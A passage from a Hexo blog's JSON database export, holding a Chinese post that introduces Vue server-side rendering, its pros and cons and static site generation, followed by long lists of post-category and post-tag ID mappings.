1.渲染一个应用\n\n\n\n\n\n","slug":"服务端渲染","published":1,"date":"2023-06-28T02:25:42.639Z","updated":"2023-06-28T03:25:55.623Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cljnys8nn0005ls9cgfthceye","content":"<h1 id=\"服务端渲染SSR\"><a href=\"#服务端渲染SSR\" class=\"headerlink\" title=\"服务端渲染SSR\"></a>服务端渲染SSR</h1><h2 id=\"一、什么是SSR？\"><a href=\"#一、什么是SSR？\" class=\"headerlink\" title=\"一、什么是SSR？\"></a>一、什么是SSR？</h2><blockquote>\n<p>vue支持在浏览器生成和操作DOM，也支持在服务端直接渲染成HTML字符串，作为服务器响应返回给浏览器；</p>\n<p>浏览器将静态HTML激活为客户端能够交互的应用；</p>\n<p>一个由服务端渲染的VueJS可以被认为是同构的或者通用的，因为吧大部分代码同时运行在服务端和客户端；</p>\n</blockquote>\n<h3 id=\"1-SSR优势\"><a href=\"#1-SSR优势\" class=\"headerlink\" title=\"1.SSR优势\"></a>1.SSR优势</h3><ul>\n<li>更快的首屏加载速度：有利于慢网速和运行缓慢的设备。</li>\n</ul>\n<p>（1）渲染方面：服务端渲染的HTML无需等待苏哦有的JS下载执行完毕才可以显示；</p>\n<p>（2）数据传输：数据获取过程在首次访问时在服务端完成，可能有更快的数据库连接；</p>\n<ul>\n<li>廷议的心智模型：可以使用相同的语言以及相同的声明式，面向组建的心智模型来开发整个应用，不需要再后端模板系统和前端框架之间来回切换；</li>\n<li>更好的SEO：搜索引擎爬虫可直接看到完全渲染的页面；</li>\n</ul>\n<blockquote>\n<p>如果你的应用以一个 loading 动画开始，然后通过 Ajax 获取内容，爬虫并不会等到内容加载完成再抓取。也就是说，如果 SEO 对你的页面至关重要，而你的内容又是异步获取的，那么 SSR 可能是必需的。</p>\n</blockquote>\n<h3 id=\"2-SSR劣势\"><a href=\"#2-SSR劣势\" class=\"headerlink\" title=\"2.SSR劣势\"></a>2.SSR劣势</h3><ul>\n<li>开发限制：浏览器特定的代码只能在某些生命周期钩子使用；外部库可能需要经过特殊处理才能在服务端渲染的应用中运行；</li>\n<li>更多的构建配置和部署相关的要求。需要一个让NodeJS运行的服务器环境。</li>\n<li>更高的服务端负载；</li>\n</ul>\n<h3 id=\"3-SSG\"><a href=\"#3-SSG\" class=\"headerlink\" title=\"3.SSG\"></a>3.SSG</h3><p>静态站点生成，又称预渲染，如果一个站点的数据对每个用户来说都是相同的，那就可以渲染一次，生成的静态HTML文件放在服务器托管。每当数据变化时，都需要重新部署。</p>\n<h2 id=\"二、基础使用\"><a href=\"#二、基础使用\" class=\"headerlink\" title=\"二、基础使用\"></a>二、基础使用</h2><h3 id=\"1-渲染一个应用\"><a href=\"#1-渲染一个应用\" class=\"headerlink\" title=\"1.渲染一个应用\"></a>1.渲染一个应用</h3>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"服务端渲染SSR\"><a href=\"#服务端渲染SSR\" class=\"headerlink\" title=\"服务端渲染SSR\"></a>服务端渲染SSR</h1><h2 id=\"一、什么是SSR？\"><a href=\"#一、什么是SSR？\" class=\"headerlink\" title=\"一、什么是SSR？\"></a>一、什么是SSR？</h2><blockquote>\n<p>vue支持在浏览器生成和操作DOM，也支持在服务端直接渲染成HTML字符串，作为服务器响应返回给浏览器；</p>\n<p>浏览器将静态HTML激活为客户端能够交互的应用；</p>\n<p>一个由服务端渲染的VueJS可以被认为是同构的或者通用的，因为吧大部分代码同时运行在服务端和客户端；</p>\n</blockquote>\n<h3 id=\"1-SSR优势\"><a href=\"#1-SSR优势\" class=\"headerlink\" title=\"1.SSR优势\"></a>1.SSR优势</h3><ul>\n<li>更快的首屏加载速度：有利于慢网速和运行缓慢的设备。</li>\n</ul>\n<p>（1）渲染方面：服务端渲染的HTML无需等待苏哦有的JS下载执行完毕才可以显示；</p>\n<p>（2）数据传输：数据获取过程在首次访问时在服务端完成，可能有更快的数据库连接；</p>\n<ul>\n<li>廷议的心智模型：可以使用相同的语言以及相同的声明式，面向组建的心智模型来开发整个应用，不需要再后端模板系统和前端框架之间来回切换；</li>\n<li>更好的SEO：搜索引擎爬虫可直接看到完全渲染的页面；</li>\n</ul>\n<blockquote>\n<p>如果你的应用以一个 loading 动画开始，然后通过 Ajax 获取内容，爬虫并不会等到内容加载完成再抓取。也就是说，如果 SEO 对你的页面至关重要，而你的内容又是异步获取的，那么 SSR 可能是必需的。</p>\n</blockquote>\n<h3 id=\"2-SSR劣势\"><a href=\"#2-SSR劣势\" class=\"headerlink\" title=\"2.SSR劣势\"></a>2.SSR劣势</h3><ul>\n<li>开发限制：浏览器特定的代码只能在某些生命周期钩子使用；外部库可能需要经过特殊处理才能在服务端渲染的应用中运行；</li>\n<li>更多的构建配置和部署相关的要求。需要一个让NodeJS运行的服务器环境。</li>\n<li>更高的服务端负载；</li>\n</ul>\n<h3 id=\"3-SSG\"><a href=\"#3-SSG\" class=\"headerlink\" title=\"3.SSG\"></a>3.SSG</h3><p>静态站点生成，又称预渲染，如果一个站点的数据对每个用户来说都是相同的，那就可以渲染一次，生成的静态HTML文件放在服务器托管。每当数据变化时，都需要重新部署。</p>\n<h2 id=\"二、基础使用\"><a href=\"#二、基础使用\" class=\"headerlink\" title=\"二、基础使用\"></a>二、基础使用</h2><h3 id=\"1-渲染一个应用\"><a href=\"#1-渲染一个应用\" class=\"headerlink\" title=\"1.渲染一个应用\"></a>1.渲染一个应用</h3>"}],"PostAsset":[],"PostCategory":[{"post_id":"clg29vydc0000ao9ce1noadl8","category_id":"clg29vyde0001ao9c30gr3d7m","_id":"clg29vydg0004ao9ch36e7cbj"},{"post_id":"clg29vydh0005ao9c99f369cq","category_id":"clg29vyde0001ao9c30gr3d7m","_id":"clg29vydi0007ao9c6xxodrld"},{"post_id":"clg29vyfr0008ao9c1g3ohndz","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyfs000cao9c5qt906pe"},{"post_id":"clg29vyfv000hao9c35of1z0v","category_id":"clg29vyde0001ao9c30gr3d7m","_id":"clg29vyfw000jao9cdtyf9voj"},{"post_id":"clg29vyfx000kao9cegt5fo5s","category_id":"clg29vyde0001ao9c30gr3d7m","_id":"clg29vyfy000mao9ccvg7bdmy"},{"post_id":"clg29vyfz000nao9cdregd85k","category_id":"clg29vyg0000pao9c6c946wg3","_id":"clg29vyg1000tao9c1jmodnbx"},{"post_id":"clg29vyfz000oao9c5qhq8c7v","category_id":"clg29vyg0000rao9c8b6h4nxs","_id":"clg29vyg1000vao9c8xds1o67"},{"post_id":"clg29vyg30012ao9cds212aw6","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyg70017ao9cgle64xzi"},{"post_id":"clg29vyg50013ao9c7nnahupt","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyg70018ao9c6ogl1b4v"},{"post_id":"clg29vyg60016ao9cau69gibj","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyg7001cao9c8peabjkz"},{"post_id":"clg29vygd001lao9c0ldy0nch","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vygf001qao9c358h34im"},{"post_id":"clg29vygd001mao9cc9nm1o4d","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vygg001tao9cglw52v9w"},{"post_id":"clg29vygg001sao9c3399btlw","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vygl0022ao9c4x3c0vtd"},{"post_id":"clg29vygh001wao9cahz07085","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vygl0024ao9c8ul079bs"},{"post_id":"clg29vyge001oao9c7uub6bkb","category_id":"clg29vygf001rao9c5f2k9pax","_id":"clg29vygm0027ao9c5knwdrzz"},{"post_id":"clg29vygj001yao9c1ymbf4hv","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vygm0029ao9c94k671j5"},{"post_id":"clg29vyge001pao9cfdj6ecse","category_id":"clg29vygk001zao9cfallc8bf","_id":"clg29vygm002cao9cd5qd1mjn"},{"post_id":"clg29vygv002nao9cdfmy2dsn","category_id":"clg29vyde0001ao9c30gr3d7m","_id":"clg29vygy002sao9chwf57yv2"},{"post_id":"clg29vygw002oao9c1i097o52","category_id":"clg29vygx002qao9cff8u85ti","_id":"clg29vygy002uao9cg9v43wo3"},{"post_id":"clg29vyh0002xao9c9ijs2d25","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyh20032ao9c5zi5da1q"},{"post_id":"clg29vyh0002yao9cfg6c2zj7","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyh30035ao9c787k927r"},{"post_id":"clg29vyh10030ao9c099g6djl","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyh40038ao9c5vii9gsv"},{"post_id":"clg29vyh10031ao9ca13l9dql","category_id":"clg29vyde0001ao9c30gr3d7m","_id":"clg29vyh4003aao9cgj0ka9zx"},{"post_id":"clg29vyh20034ao9c3zzf80m7","category_id":"clg29vyde0001ao9c30gr3d7m","_id":"clg29vyh4003cao9c276fea8m"},{"post_id":"clg29vyh6003jao9c2a7q3obh","category_id":"clg29vyde0001ao9c30gr3d7m","_id":"clg29vyh8003pao9chm7pfohn"},{"post_id":"clg29vyh7003mao9c8pevcnun","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyh9003rao9c4diugjrv"},{"post_id":"clg29vyh6003iao9c7zex4hu2","category_id":"clg29vyh7003kao9caoc1gcj6","_id":"clg29vyh9003tao9c79fsgfcw"},{"post_id":"clg29vyhh003vao9cddbkbpni","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyhk0041ao9cezk12clc"},{"post_id":"clg29vyhh003wao9cdp1sboix","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyhl0044ao9c2xm28x45"},{"post_id":"clg29vyhj003yao9cd6cxerb8","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyhm0047ao9cabu08ksh"},{"post_id":"clg29vyhj0040ao9c5but853s","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyho004aao9c8vnf0tgz"},{"post_id":"clg29vyhk0043ao9cbc6u1hn1","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyho004dao9ch3w20qz6"},{"post_id":"clg29vyhl0046ao9c8z8363vm","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyhp004gao9c7b2r6wl1"},{"post_id":"clg29vyhn0049ao9cbvf2hidn","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyhq004jao9c5q2o2l5i"},{"post_id":"clg29vyho004cao9c3ck3c76x","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyhq004mao9cd1rub8eo"},{"post_id":"clg29vyhp004fao9ccyxo3ai3","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyhs004qao9chhcwdhrm"},{"post_id":"clg29vyhp004iao9c0c3wgdad","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyhs004tao9c3sta7098"},{"post_id":"clg29vyhq004lao9chrvv7hcl","category_id":"clg29vygf001rao9c5f2k9pax","_id":"clg29vyht004xao9chh314d6e"},{"post_id":"clg29vyhs004sao9c8852asaj","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyhv0052ao9cca2xdchl"},{"post_id":"clg29vyht004vao9c73gn5ss9","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyhw0056ao9cenrbhbqz"},{"post_id":"clg29vyhu004zao9c4pyue59b","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyhx0059ao9c7icvfk9l"},{"post_id":"clg29vyhu0051ao9c6k7oahf1","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyhx005dao9c8ecj9wbo"},{"post_id":"clg29vyhv0055ao9c7vlm217p","category_id":"clg29vygx002qao9cff8u85ti","_id":"clg29vyhy005hao9cfeky7wm6"},{"post_id":"clg29vyhx005cao9cd0ifglyj","category_id":"clg29vygf001rao9c5f2k9pax","_id":"clg29vyi0005nao9cg9zy0xfn"},{"post_id":"clg29vyhy005kao9c8ghz2bj5","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyi2005tao9c6rq0g9eq"},{"post_id":"clg29vyhw0058ao9c79a1eeqo","category_id":"clg29vyhy005eao9c3vv69kra","_id":"clg29vyi2005wao9cdfwt2j3h"},{"post_id":"clg29vyi1005rao9cgjmte622","category_id":"clg29vygk001zao9cfallc8bf","_id":"clg29vyi3005zao9cgrmt4mq8"},{"post_id":"clg29vyhy005gao9c4myxb1g3","category_id":"clg29vyi1005oao9c6mdthxzw","_id":"clg29vyi30061ao9ce1669o54"},{"post_id":"clg29vyi0005mao9cannn6zql","category_id":"clg29vyi2005uao9c4t2a5mw2","_id":"clg29vyi40064ao9ce3jx0mir"},{"post_id":"clg29vyi8006rao9c2qgp5dq3","category_id":"clg29vyi2005uao9c4t2a5mw2","_id":"clg29vyia006xao9cd2xled46"},{"post_id":"clg29vyi9006sao9cevrihsjs","category_id":"clg29vyde0001ao9c30gr3d7m","_id":"clg29vyib0071ao9carly6m0t"},{"post_id":"clg29vyia006wao9c1yah4j4h","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyid0075ao9c4uws0wlc"},{"post_id":"clg29vyib0070ao9ccnw72rgf","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg29vyid0078ao9cci8x6y8q"},{"post_id":"clg29vyic0073ao9c1tl6bfdw","category_id":"clg29vyg0000rao9c8b6h4nxs","_id":"clg29vyid007aao9c6gicfvu6"},{"post_id":"clg29vyia006uao9c0s7ycy51","category_id":"clg29vyib006yao9ca9c99xvi","_id":"clg29vyid007cao9c4kqm3wbi"},{"post_id":"clg29vyhr004pao9cd3s4cn14","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg2ayc0h00025w9c0lrd69d6"},{"post_id":"clg29vyg50015ao9c35zo34u3","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg2aywpp00055w9ceyebcr1p"},{"post_id":"clg29vyg9001kao9ccb6egzmx","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg2az8uv00095w9cbgsh22cs"},{"post_id":"clg2b48w80001989c0n1z19ud","category_id":"clg29vygf001rao9c5f2k9pax","_id":"clg2bbz7b0003989c72gf4tfe"},{"post_id":"clg4k4gq00000ww9cg6vr75bw","category_id":"clg4k4gq50001ww9cd1e82ign","_id":"clg4k4gqh0004ww9c62767hxw"},{"post_id":"clg4k4gqk0008ww9c2vwofoca","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"clg4k4gql000aww9cebm23q9n"},{"post_id":"cljf1dojs0002ak9chic5e6h5","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"cljf1dok50006ak9c9sa17an6"},{"post_id":"cljf1dok30005ak9cbuitc4ht","category_id":"clg29vygf001rao9c5f2k9pax","_id":"cljf1dok60009ak9c2hfq7qf9"},{"post_id":"cljf1dojp0001ak9c795camph","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"cljf1f8ax00025o9cazefc993"},{"post_id":"cljf1dojt0003ak9c1qa4dtlr","category_id":"clg29vyfr0009ao9chclo4i3i","_id":"cljf1g24400085o9cgltodz84"},{"post_id":"cljnys8n00000ls9cexp1h5ee","category_id":"cljnys8n70002ls9ca1014e09","_id":"cljnys8nq0009ls9c1tid7tbj"},{"post_id":"cljnys8n40001ls9c4ajzgscn","category_id":"cljnys8no0006ls9c2wfi18fz","_id":"cljnys8nq000bls9c04pk3vnp"}],"PostTag":[{"post_id":"clg29vydc0000ao9ce1noadl8","tag_id":"clg29vydf0002ao9c46v07l2b","_id":"clg29vydf0003ao9cdjw8ar7t"},{"post_id":"clg29vydh0005ao9c99f369cq","tag_id":"clg29vydf0002ao9c46v07l2b","_id":"clg29vydi0006ao9c9ctk7kpm"},{"post_id":"clg29vyfr0008ao9c1g3ohndz","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vyfs000eao9ceunn2a62"},{"post_id":"clg29vyfr0008ao9c1g3ohndz","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyft000fao9c61akggm4"},{"post_id":"clg29vyfr0008ao9c1g3ohndz","tag_id":"clg29vyfs000dao9c42ok0l5l","_id":"clg29vyft000gao9ccgrx322a"},{"post_id":"clg29vyfv000hao9c35of1z0v","tag_id":"clg29vydf0002ao9c46v07l2b","_id":"clg29vyfv000iao9c35lf2t0d"},{"post_id":"clg29vyfx000kao9cegt5fo5s","tag_id":"clg29vydf0002ao9c46v07l2b","_id":"clg29vyfy000lao9c0rwjamt7"},{"post_id":"clg29vyfz000nao9cdregd85k","tag_id":"clg29vyg0000qao9cb8sn3m9w","_id":"clg29vyg1000xao9c861l5ict"},{"post_id":"clg29vyfz000nao9cdregd85k","tag_id":"clg29vyg0000sao9chttweckv","_id":"clg29vyg2000yao9c5vtk6jvd"},{"post_id":"clg29vyfz000nao9cdregd85k","tag_id":"clg29vyg1000uao9c6t150h9d","_id":"clg29vyg2000zao9ch5bwg51x"},{"post_id":"clg29vyfz000oao9c5qhq8c7v","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyg20010ao9c40bsgou6"},{"post_id":"clg29vyfz000oao9c5qhq8c7v","tag_id":"clg29vyg1000wao9c0wzzgbw0","_id":"clg29vyg20011ao9ca9fpg33y"},{"post_id":"clg29vyg30012ao9cds212aw6","tag_id":"clg29vyg50014ao9c5ddy3w5q","_id":"clg29vyg7001aao9cg19n3kjw"},{"post_id":"clg29vyg30012ao9cds212aw6","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyg7001bao9c7f141bqv"},{"post_id":"clg29vyg50013ao9c7nnahupt","tag_id":"clg29vyg70019ao9c8aee3tga","_id":"clg29vyg8001fao9caxwgbd5s"},{"post_id":"clg29vyg50013ao9c7nnahupt","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyg8001gao9c4p3a7b50"},{"post_id":"clg29vyg50013ao9c7nnahupt","tag_id":"clg29vyg7001dao9cdcye2miv","_id":"clg29vyg8001hao9c5c9hbgvq"},{"post_id":"clg29vyg60016ao9cau69gibj","tag_id":"clg29vyg8001eao9c0l8daajm","_id":"clg29vyg8001iao9c6daj6vxl"},{"post_id":"clg29vyg60016ao9cau69gibj","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyg8001jao9cbcg51c44"},{"post_id":"clg29vygd001lao9c0ldy0nch","tag_id":"clg29vyge001nao9c8nx67977","_id":"clg29vygh001vao9cdai0blrt"},{"post_id":"clg29vygd001lao9c0ldy0nch","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vygj001xao9cb5jcgpfx"},{"post_id":"clg29vygg001sao9c3399btlw","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vygl0021ao9ch01weyzl"},{"post_id":"clg29vygg001sao9c3399btlw","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vygl0023ao9c3l7sf666"},{"post_id":"clg29vygg001sao9c3399btlw","tag_id":"clg29vyfs000dao9c42ok0l5l","_id":"clg29vygm0026ao9cdgvccwwc"},{"post_id":"clg29vygh001wao9cahz07085","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vygm0028ao9c6qjya9qa"},{"post_id":"clg29vygh001wao9cahz07085","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vygm002bao9cfekxg95e"},{"post_id":"clg29vygh001wao9cahz07085","tag_id":"clg29vyfs000dao9c42ok0l5l","_id":"clg29vygm002dao9c0gub31t2"},{"post_id":"clg29vygd001mao9cc9nm1o4d","tag_id":"clg29vygg001uao9ccdne6xcc","_id":"clg29vygn002eao9c5u3i24e7"},{"post_id":"clg29vygd001mao9cc9nm1o4d","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vygn002gao9chcid6imi"},{"post_id":"clg29vyge001oao9c7uub6bkb","tag_id":"clg29vygk0020ao9cd5jt7idd","_id":"clg29vygn002hao9c90iq1f4l"},{"post_id":"clg29vyge001oao9c7uub6bkb","tag_id":"clg29vygl0025ao9c7ku75jpg","_id":"clg29vygo002iao9ce2b3biqf"},{"post_id":"clg29vyge001pao9cfdj6ecse","tag_id":"clg29vyg0000qao9cb8sn3m9w","_id":"clg29vygo002jao9c3za4bsna"},{"post_id":"clg29vyge001pao9cfdj6ecse","tag_id":"clg29vygm002aao9c1agy2if6","_id":"clg29vygo002kao9c5v3m1d6x"},{"post_id":"clg29vygj001yao9c1ymbf4hv","tag_id":"clg29vygn002fao9chsf3dgz7","_id":"clg29vygo002lao9c1qgf0ubf"},{"post_id":"clg29vygj001yao9c1ymbf4hv","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vygo002mao9c3ung45kv"},{"post_id":"clg29vygv002nao9cdfmy2dsn","tag_id":"clg29vydf0002ao9c46v07l2b","_id":"clg29vygx002pao9c2z136lag"},{"post_id":"clg29vygw002oao9c1i097o52","tag_id":"clg29vygy002rao9c9yo6df37","_id":"clg29vygy002vao9ca69ub1kc"},{"post_id":"clg29vygw002oao9c1i097o52","tag_id":"clg29vygy002tao9cb6ovgexz","_id":"clg29vygz002wao9cfpfa9tcx"},{"post_id":"clg29vyh10030ao9c099g6djl","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vyh20033ao9cgeic8zih"},{"post_id":"clg29vyh10030ao9c099g6djl","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyh40037ao9cda0ug06t"},{"post_id":"clg29vyh10030ao9c099g6djl","tag_id":"clg29vyfs000dao9c42ok0l5l","_id":"clg29vyh40039ao9c4wu4ho8b"},{"post_id":"clg29vyh10031ao9ca13l9dql","tag_id":"clg29vydf0002ao9c46v07l2b","_id":"clg29vyh4003bao9cbk740o37"},{"post_id":"clg29vyh0002xao9c9ijs2d25","tag_id":"clg29vyh1002zao9c691f4bwh","_id":"clg29vyh4003dao9c9kc1hrvz"},{"post_id":"clg29vyh0002xao9c9ijs2d25","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyh4003eao9c7v7g8wuy"},{"post_id":"clg29vyh20034ao9c3zzf80m7","tag_id":"clg29vydf0002ao9c46v07l2b","_id":"clg29vyh4003fao9cawn49136"},{"post_id":"clg29vyh0002yao9cfg6c2zj7","tag_id":"clg29vyh30036ao9cb4ufbkd9","_id":"clg29vyh4003gao9c21z4c1rc"},{"post_id":"clg29vyh0002yao9cfg6c2zj7","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyh4003hao9c1mu6ho9o"},{"post_id":"clg29vyh6003jao9c2a7q3obh","tag_id":"clg29vydf0002ao9c46v07l2b","_id":"clg29vyh8003nao9cduxu4qtd"},{"post_id":"clg29vyh7003mao9c8pevcnun","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vyh8003oao9cbty33cni"},{"post_id":"clg29vyh7003mao9c8pevcnun","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyh9003qao9ccx7nb63v"},{"post_id":"clg29vyh7003mao9c8pevcnun","tag_id":"clg29vyfs000dao9c42ok0l5l","_id":"clg29vyh9003sao9ca485cuf4"},{"post_id":"clg29vyh6003iao9c7zex4hu2","tag_id":"clg29vyh7003lao9cbsifact8","_id":"clg29vyh9003uao9c4zsf0z21"},{"post_id":"clg29vyhh003vao9cddbkbpni","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vyhi003xao9c12os7e4a"},{"post_id":"clg29vyhh003vao9cddbkbpni","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyhj003zao9c8dhhe37z"},{"post_id":"clg29vyhh003vao9cddbkbpni","tag_id":"clg29vyfs000dao9c42ok0l5l","_id":"clg29vyhk0042ao9c4n1f3zju"},{"post_id":"clg29vyhh003wao9cdp1sboix","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vyhl0045ao9ce17k13wa"},{"post_id":"clg29vyhh003wao9cdp1sboix","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyhn0048ao9chlyf1lpt"},{"post_id":"clg29vyhh003wao9cdp1sboix","tag_id":"clg29vyfs000dao9c42ok0l5l","_id":"clg29vyho004bao9c6tx61tid"},{"post_id":"clg29vyhj003yao9cd6cxerb8","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vyhp004eao9c4jku4o59"},{"post_id":"clg29vyhj003yao9cd6cxerb8","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyhp004hao9c6lb517v8"},{"post_id":"clg29vyhj003yao9cd6cxerb8","tag_id":"clg29vyfs000dao9c42ok0l5l","_id":"clg29vyhq004kao9c6398fgt7"},{"post_id":"clg29vyhj0040ao9c5but853s","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vyhr004oao9cfbmwhx3g"},{"post_id":"clg29vyhj0040ao9c5but853s","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyhs004rao9c14rt3n29"},{"post_id":"clg29vyhj0040ao9c5but853s","tag_id":"clg29vyfs000dao9c42ok0l5l","_id":"clg29vyht004uao9cgoaj7gtl"},{"post_id":"clg29vyhk0043ao9cbc6u1hn1","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vyhu004yao9c38562fpo"},{"post_id":"clg29vyhk0043ao9cbc6u1hn1","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyhu0050ao9c0fcj2b8i"},{"post_id":"clg29vyhk0043ao9cbc6u1hn1","tag_id":"clg29vyfs000dao9c42ok0l5l","_id":"clg29vyhv0054ao9ccivx6uit"},{"post_id":"clg29vyhl0046ao9c8z8363vm","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vyhw0057ao9cetrpevoe"},{"post_id":"clg29vyhl0046ao9c8z8363vm","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyhx005bao9ccqfc1ta6"},{"post_id":"clg29vyhn0049ao9cbvf2hidn","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vyhy005fao9cbcaugc0p"},{"post_id":"clg29vyhn0049ao9cbvf2hidn","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyhy005jao9c3fanfc5n"},{"post_id":"clg29vyho004cao9c3ck3c76x","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vyi0005lao9c710geitr"},{"post_id":"clg29vyho004cao9c3ck3c76x","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyi1005qao9c8r4kbyp4"},{"post_id":"clg29vyhp004fao9ccyxo3ai3","tag_id":"clg29vyfs000aao9c2pj77zl4","_id":"clg29vyi2005sao9cbvkkghja"},{"post_id":"clg29vyhp004fao9ccyxo3ai3","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyi2005vao9c7pc14as2"},{"post_id":"clg29vyhp004fao9ccyxo3ai3","tag_id":"clg29vyfs000dao9c42ok0l5l","_id":"clg29vyi3005yao9cbgjdeudb"},{"post_id":"clg29vyhp004iao9c0c3wgdad","tag_id":"clg29vyhr004nao9ccal5eic7","_id":"clg29vyi30060ao9c646idkoa"},{"post_id":"clg29vyhp004iao9c0c3wgdad","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyi40063ao9chl4xgfxp"},{"post_id":"clg29vyht004vao9c73gn5ss9","tag_id":"clg29vyh1002zao9c691f4bwh","_id":"clg29vyi40065ao9cd0ovc23x"},{"post_id":"clg29vyht004vao9c73gn5ss9","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyi40067ao9c70fh8lap"},{"post_id":"clg29vyhq004lao9chrvv7hcl","tag_id":"clg29vygk0020ao9cd5jt7idd","_id":"clg29vyi40068ao9c2wdpa369"},{"post_id":"clg29vyhq004lao9chrvv7hcl","tag_id":"clg29vyht004wao9ccoyv32q0","_id":"clg29vyi5006aao9c8zhh55vf"},{"post_id":"clg29vyhs004sao9c8852asaj","tag_id":"clg29vyhv0053ao9cb7jz7plj","_id":"clg29vyi5006bao9c7rg4gr8o"},{"post_id":"clg29vyhs004sao9c8852asaj","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyi5006cao9cdbdcdikl"},{"post_id":"clg29vyhx005cao9cd0ifglyj","tag_id":"clg29vyht004wao9ccoyv32q0","_id":"clg29vyi5006dao9c1ta321zj"},{"post_id":"clg29vyhu004zao9c4pyue59b","tag_id":"clg29vyhx005aao9cgr0i1o56","_id":"clg29vyi5006eao9c86y2ap4v"},{"post_id":"clg29vyhu004zao9c4pyue59b","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyi5006fao9c78qyc2w4"},{"post_id":"clg29vyhy005kao9c8ghz2bj5","tag_id":"clg29vyhr004nao9ccal5eic7","_id":"clg29vyi5006gao9cgc8f278n"},{"post_id":"clg29vyhy005kao9c8ghz2bj5","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyi5006hao9c2asofjnu"},{"post_id":"clg29vyhu0051ao9c6k7oahf1","tag_id":"clg29vyhx005aao9cgr0i1o56","_id":"clg29vyi5006iao9c6pgw1dez"},{"post_id":"clg29vyhu0051ao9c6k7oahf1","tag_id":"clg29vyfs000bao9cf9ina7ac","_id":"clg29vyi5006jao9c9k6q298f"},{"post_id":"clg29vyhv0055ao9c7vlm217p","tag_id":"clg29vygy002rao9c9yo6df37","_id":"clg29vyi5006kao9cf3tc38oy"},{"post_id":"clg29vyhv0055ao9c7vlm217p","tag_id":"clg29vyi1005pao9cbo1mc0os","_id":"clg29vyi5006lao9c2uh1cy3v"},{"post_id":"clg29vyhw0058ao9c79a1eeqo","tag_id":"clg29v